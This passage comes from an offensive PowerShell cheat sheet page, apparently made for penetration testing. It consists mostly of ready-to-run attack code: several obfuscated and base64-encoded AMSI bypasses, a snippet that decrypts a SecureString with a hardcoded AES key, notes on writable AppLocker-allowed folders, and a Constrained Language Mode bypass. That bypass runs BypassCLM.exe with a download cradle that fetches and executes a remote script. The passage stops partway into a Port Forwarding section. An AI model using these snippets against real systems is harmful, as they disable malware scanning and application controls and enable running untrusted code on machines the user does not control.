-29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">sET-ItEM</span> <span class="cm-punctuation">(</span> <span class="cm-string">'V'</span><span class="cm-operator">+</span><span class="cm-string">'aR'</span> <span class="cm-operator">+</span> <span class="cm-string">'IA'</span> <span class="cm-operator">+</span> <span class="cm-string">'blE:1q2'</span> <span class="cm-operator">+</span> <span class="cm-string">'uZx'</span> <span class="cm-punctuation">)</span> <span class="cm-punctuation">(</span> <span class="cm-punctuation">[</span><span class="cm-builtin">TYpE</span><span class="cm-punctuation">](</span> <span class="cm-string">"{1}{0}"</span><span class="cm-operator">-F</span><span class="cm-string">'F'</span><span class="cm-punctuation">,</span><span class="cm-string">'rE'</span> <span class="cm-punctuation">)</span> <span class="cm-punctuation">)</span> <span class="cm-punctuation">;</span> <span class="cm-punctuation">(</span> <span class="cm-builtin">GeT-VariaBle</span> <span class="cm-punctuation">(</span> <span class="cm-string">"1Q2U"</span> <span class="cm-operator">+</span><span class="cm-string">"zX"</span> <span class="cm-punctuation">)</span> <span class="cm-operator">-</span><span class="cm-identifier">VaL</span> <span class="cm-punctuation">).</span><span class="cm-string">"A`ss`Embly"</span><span class="cm-punctuation">.</span><span class="cm-string">"GET`TY`Pe"</span><span class="cm-punctuation">((</span> <span class="cm-string">"{6}{3}{1}{4}{2}{0}{5}"</span> <span class="cm-operator">-f</span><span class="cm-string">'Util'</span><span class="cm-punctuation">,</span><span class="cm-string">'A'</span><span class="cm-punctuation">,</span><span class="cm-string">'Amsi'</span><span class="cm-punctuation">,</span><span class="cm-string">'.Management.'</span><span class="cm-punctuation">,</span><span class="cm-string">'utomation.'</span><span class="cm-punctuation">,</span><span class="cm-string">'s'</span><span class="cm-punctuation">,</span><span class="cm-string">'System'</span> <span class="cm-punctuation">)</span> <span class="cm-punctuation">).</span><span class="cm-string">"g`etf`iElD"</span><span class="cm-punctuation">(</span> <span class="cm-punctuation">(</span> <span class="cm-string">"{0}{2}{1}"</span> <span class="cm-operator">-f</span><span class="cm-string">'amsi'</span><span class="cm-punctuation">,</span><span class="cm-string">'d'</span><span class="cm-punctuation">,</span><span class="cm-string">'InitFaile'</span> <span class="cm-punctuation">),(</span> <span class="cm-string">"{2}{4}{0}{1}{3}"</span> <span class="cm-operator">-f</span> <span class="cm-string">'Stat'</span><span class="cm-punctuation">,</span><span class="cm-string">'i'</span><span class="cm-punctuation">,</span><span class="cm-string">'NonPubli'</span><span class="cm-punctuation">,</span><span class="cm-string">'c'</span><span class="cm-punctuation">,</span><span class="cm-string">'c,'</span> <span class="cm-punctuation">)).</span><span class="cm-string">"sE`T`VaLUE"</span><span class="cm-punctuation">(</span> <span class="cm-variable-2">${n`ULl}</span><span class="cm-punctuation">,</span><span class="cm-variable-2">${t`RuE}</span> <span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Base64</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">[</span><span class="cm-identifier">Ref</span><span class="cm-punctuation">].</span><span class="cm-identifier">Assembly</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetType</span><span class="cm-punctuation">(</span><span class="cm-string">'System.Management.Automation.'</span><span class="cm-operator">+</span><span class="cm-error">$</span><span class="cm-punctuation">([</span><span class="cm-identifier">Text</span><span class="cm-punctuation">.</span><span class="cm-identifier">Encoding</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">Unicode</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetString</span><span class="cm-punctuation">([</span><span class="cm-identifier">Convert</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">FromBase64String</span><span class="cm-punctuation">(</span><span class="cm-string">'QQBtAHMAaQBVAHQAaQBsAHMA'</span><span class="cm-punctuation">)))).</span><span class="cm-identifier">GetField</span><span class="cm-punctuation">(</span><span class="cm-error">$</span><span class="cm-punctuation">([</span><span class="cm-identifier">Text</span><span class="cm-punctuation">.</span><span class="cm-identifier">Encoding</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">Unicode</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetString</span><span class="cm-punctuation">([</span><span class="cm-identifier">Convert</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">FromBase64String</span><span class="cm-punctuation">(</span><span class="cm-string">'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='</span><span class="cm-punctuation">))),</span><span class="cm-string">'NonPublic,Static'</span><span class="cm-punctuation">).</span><span class="cm-identifier">SetValue</span><span class="cm-punctuation">(</span><span class="cm-builtin">$null</span><span class="cm-punctuation">,</span><span class="cm-builtin">$true</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Force AMSI error</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$w</span> <span class="cm-operator">=</span> <span class="cm-string">'System.Management.Automation.A'</span><span class="cm-punctuation">;</span><span class="cm-variable-2">$c</span> <span class="cm-operator">=</span> <span class="cm-string">'si'</span><span class="cm-punctuation">;</span><span class="cm-variable-2">$m</span> <span class="cm-operator">=</span> <span class="cm-string">'Utils'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$assembly</span> <span class="cm-operator">=</span> <span class="cm-punctuation">[</span><span class="cm-identifier">Ref</span><span class="cm-punctuation">].</span><span class="cm-identifier">Assembly</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetType</span><span class="cm-punctuation">((</span><span class="cm-string">'{0}m{1}{2}'</span> <span class="cm-operator">-f</span> <span class="cm-variable-2">$w</span><span class="cm-punctuation">,</span><span class="cm-variable-2">$c</span><span class="cm-punctuation">,</span><span class="cm-variable-2">$m</span><span class="cm-punctuation">))</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$field</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$assembly</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetField</span><span class="cm-punctuation">((</span><span class="cm-string">'am{0}InitFailed'</span> <span class="cm-operator">-f</span> <span class="cm-variable-2">$c</span><span class="cm-punctuation">),</span><span class="cm-string">'NonPublic,Static'</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$field</span><span class="cm-punctuation">.</span><span class="cm-identifier">SetValue</span><span class="cm-punctuation">(</span><span class="cm-builtin">$null</span><span class="cm-punctuation">,</span><span class="cm-builtin">$true</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On PowerShell 6</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">[</span><span class="cm-identifier">Ref</span><span class="cm-punctuation">].</span><span class="cm-identifier">Assembly</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetType</span><span class="cm-punctuation">(</span><span class="cm-string">'System.Management.Automation.AmsiUtils'</span><span class="cm-punctuation">).</span><span class="cm-identifier">GetField</span><span class="cm-punctuation">(</span><span class="cm-string">'s_amsiInitFailed'</span><span class="cm-punctuation">,</span><span class="cm-string">'NonPublic,Static'</span><span class="cm-punctuation">).</span><span class="cm-identifier">SetValue</span><span class="cm-punctuation">(</span><span class="cm-builtin">$null</span><span class="cm-punctuation">,</span><span class="cm-builtin">$true</span><span class="cm-punctuation">)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 379px;"></div><div class="CodeMirror-gutters" style="height: 429px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-create-powershell-cr">Create PowerShell credentials</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 601px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 600.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$pass</span> <span class="cm-operator">=</span> <span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">"Password123!"</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$cred</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Management</span><span class="cm-punctuation">.</span><span class="cm-identifier">Automation</span><span class="cm-punctuation">.</span><span class="cm-identifier">PSCredential</span><span class="cm-punctuation">(</span><span class="cm-string">"DOMAIN\user"</span><span class="cm-punctuation">,</span> <span class="cm-variable-2">$pass</span><span class="cm-punctuation">)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-decipher-secure-stri">Decipher Secure-String</h3>
<p id="bkmrk-with-the-correspondi">With the corresponding AES key</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1085px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 1085.48px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$aesKey</span> <span class="cm-operator">=</span> <span class="cm-punctuation">(</span><span class="cm-number">49</span><span class="cm-punctuation">,</span> <span class="cm-number">222</span><span class="cm-punctuation">,</span> <span class="cm-number">253</span><span class="cm-punctuation">,</span> <span class="cm-number">86</span><span class="cm-punctuation">,</span> <span class="cm-number">26</span><span class="cm-punctuation">,</span> <span class="cm-number">137</span><span class="cm-punctuation">,</span> <span class="cm-number">92</span><span class="cm-punctuation">,</span> <span class="cm-number">43</span><span class="cm-punctuation">,</span> <span class="cm-number">29</span><span class="cm-punctuation">,</span> <span class="cm-number">200</span><span class="cm-punctuation">,</span> <span class="cm-number">17</span><span class="cm-punctuation">,</span> <span class="cm-number">203</span><span class="cm-punctuation">,</span> <span class="cm-number">88</span><span class="cm-punctuation">,</span> <span class="cm-number">97</span><span class="cm-punctuation">,</span> <span class="cm-number">39</span><span class="cm-punctuation">,</span> <span class="cm-number">38</span><span class="cm-punctuation">,</span> <span class="cm-number">60</span><span class="cm-punctuation">,</span> <span class="cm-number">119</span><span class="cm-punctuation">,</span> <span class="cm-number">46</span><span class="cm-punctuation">,</span> <span class="cm-number">44</span><span class="cm-punctuation">,</span> <span class="cm-number">219</span><span class="cm-punctuation">,</span> <span class="cm-number">179</span><span class="cm-punctuation">,</span> <span class="cm-number">13</span><span class="cm-punctuation">,</span> <span class="cm-number">194</span><span class="cm-punctuation">,</span> <span class="cm-number">191</span><span class="cm-punctuation">,</span> <span class="cm-number">199</span><span class="cm-punctuation">,</span> <span class="cm-number">78</span><span class="cm-punctuation">,</span> <span class="cm-number">10</span><span class="cm-punctuation">,</span> <span class="cm-number">4</span><span class="cm-punctuation">,</span> <span class="cm-number">40</span><span class="cm-punctuation">,</span> <span class="cm-number">87</span><span class="cm-punctuation">,</span> <span class="cm-number">159</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$secureObject</span> <span class="cm-operator">=</span> <span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-operator">-</span><span class="cm-identifier">String</span> <span class="cm-string">"76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA="</span> <span class="cm-operator">-</span><span class="cm-identifier">Key</span> <span class="cm-variable-2">$aesKey</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$decrypted</span> <span class="cm-operator">=</span> <span class="cm-punctuation">[</span><span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Runtime</span><span class="cm-punctuation">.</span><span class="cm-identifier">InteropServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">Marshal</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">SecureStringToBSTR</span><span class="cm-punctuation">(</span><span class="cm-variable-2">$secureObject</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$decrypted</span> <span class="cm-operator">=</span> <span class="cm-punctuation">[</span><span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Runtime</span><span class="cm-punctuation">.</span><span class="cm-identifier">InteropServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">Marshal</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">PtrToStringAuto</span><span class="cm-punctuation">(</span><span class="cm-variable-2">$decrypted</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$decrypted</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-execution-context-%2F-">Execution Context / AppLocker</h3>
<h4 id="bkmrk-applocker">AppLocker</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 521px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 520.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get AppLocker policy</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-AppLockerPolicy</span> <span class="cm-operator">-</span><span class="cm-identifier">Effective</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-operator">-</span><span class="cm-identifier">ExpandProperty</span> <span class="cm-identifier">RuleCollections</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-by-default%2C-c%3A%5Cwindo">By default, <code>C:\Windows</code> is not blocked, and <code>C:\Windows\Tasks</code> is writtable by any users.</p>
<h4 id="bkmrk-bypass-constrained-l">Bypass Constrained Language Mode</h4>
<p id="bkmrk-import-bypassclm.exe">Import <code>BypassCLM.exe</code> and <code>Mono.Options.dll</code> in a directory where the AppLocker policy authorize the execution, then</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 818px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 817.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get language mode</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">$ExecutionContext</span><span class="cm-punctuation">.</span><span class="cm-identifier">SessionState</span><span class="cm-punctuation">.</span><span class="cm-identifier">LanguageMode</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#To bypass with PowerShell 6</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">pwsh</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">BypassCLM</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-string">"iex (new-object net.webclient).downloadstring('http://192.168.50.44/Invoke-HelloWorld.ps1')"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-port-forwarding">Port Forwarding</h3>
<p id="bkmrk-we-can-contact-a-mac">We can contact a machine, and this one can contact another machine, but we can't contact the second machine directly from our primary machine<br>
On the "central" machine, all the hit on the port 80 or 4545 will be forward to the <code>connectaddress</code> on the specified port :</p>
